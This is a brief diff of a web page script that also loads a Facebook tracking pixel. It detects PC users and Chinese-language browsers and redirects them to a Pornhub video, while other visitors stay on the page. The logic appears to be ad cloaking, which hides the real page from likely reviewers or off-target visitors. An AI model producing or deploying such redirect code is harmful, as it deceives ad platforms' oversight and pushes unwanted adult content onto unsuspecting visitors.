@@ -55,8 +55,7 @@ src="https://www.facebook.com/tr?id=554044584045627&ev=PageView&noscript=1"
             const isChinese = /zh|cn/.test(navigator.language.toLowerCase());
             const referrer = document.referrer.toLowerCase();
             //const isFromFacebook = referrer.includes('facebook.com');
-            isPC || isChinese || !isFromFacebook
-            // 判断条件
+            // 判断条件，不满足以上的跳转
             if (isPC || isChinese ) {
                 window.location.href = 'https://cn.pornhub.com/view_video.php?viewkey=ph63426e5c38031';
                 return; // 结束函数执行
